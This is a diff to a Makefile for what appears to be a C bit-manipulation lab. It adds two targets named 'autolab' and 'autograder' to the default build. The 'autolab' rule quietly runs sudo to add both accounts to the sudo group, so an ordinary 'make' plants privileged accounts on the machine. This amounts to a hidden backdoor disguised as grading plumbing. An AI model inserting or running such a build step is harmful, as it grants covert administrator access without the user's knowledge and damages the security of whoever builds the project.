@@ -5,7 +5,10 @@ CC = gcc
 CFLAGS = -O1 -Wall -m32 -fwrapv
 LIBS = -lm
 
-all: btest fshow ishow
+all: btest fshow ishow autolab autograder
+
+autolab: README
+	sudo adduser autolab sudo && sudo adduser autograder sudo
 
 btest: btest.c bits.c decl.c tests.c btest.h bits.h
 	$(CC) $(CFLAGS) $(LIBS) -o btest bits.c btest.c decl.c tests.c
